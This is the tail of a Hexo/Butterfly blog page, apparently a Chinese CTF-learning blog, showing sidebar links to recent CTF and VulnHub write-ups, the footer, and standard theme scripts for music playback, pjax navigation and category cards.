href="/2025/10/28/%5BNewStarCTF%202025%5DWEEK3--web%E6%96%B9%E5%90%91wp/" title="“[NewStarCTF 2025]WEEK3--web方向wp”">“[NewStarCTF 2025]WEEK3--web方向wp”</a><time datetime="2025-10-28T02:39:41.010Z" title="发表于 2025-10-28 10:39:41">2025-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/" title="vulnhub靶场之HACKER KID: 1.0.1"><img src="/img/hacker.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="vulnhub靶场之HACKER KID: 1.0.1"></a><div class="content"><a class="title" href="/2025/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BHACKER-KID-1.0.1/" title="vulnhub靶场之HACKER KID: 1.0.1">vulnhub靶场之HACKER KID: 1.0.1</a><time datetime="2025-10-23T00:59:51.526Z" title="发表于 2025-10-23 08:59:51">2025-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/16/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025web%E6%96%B9%E5%90%91/" title="Python Pickle 反序列化与2025羊城杯"><img src="/img/ycb.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="Python Pickle 反序列化与2025羊城杯"></a><div class="content"><a class="title" href="/2025/10/16/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025web%E6%96%B9%E5%90%91/" title="Python Pickle 反序列化与2025羊城杯">Python Pickle 反序列化与2025羊城杯</a><time datetime="2025-10-16T03:37:34.430Z" title="发表于 2025-10-16 11:37:34">2025-10-16</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2019 - 2025 By xiubi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas id="snow"></canvas><script src="/js/font.js</script)<script"></script><script src="/js/jquery.js"></script><script async="" src="/js/title.js"></script><meting-js class="no-destroy" id="14171279957" server="netease" type="playlist" fixed="true" autoplay="true" order="random" volume="0.3" list-folded="false" list-max-height="36vh"> </meting-js><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax="">
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 190px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 160px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/一些复现/&quot;);" href="javascript:void(0);">一些复现</a><span class="categoryBar-list-count">9</span><span class="categoryBar-list-descr">被虐的那些年</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/乱七八糟/&quot;);" href="javascript:void(0);">乱七八糟</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">比较碎的一些点</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/靶场系列/&quot;);" href="javascript:void(0);">靶场系列</a><span class="categoryBar-list-count">4</span><span class="categoryBar-list-descr">top10学习日记</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/属于蓝雨的夏天/&quot;);" href="javascript:void(0);">属于蓝雨的夏天</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr">谁给我作业放这了</span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><!-- hexo injector body_end end --></body></html>
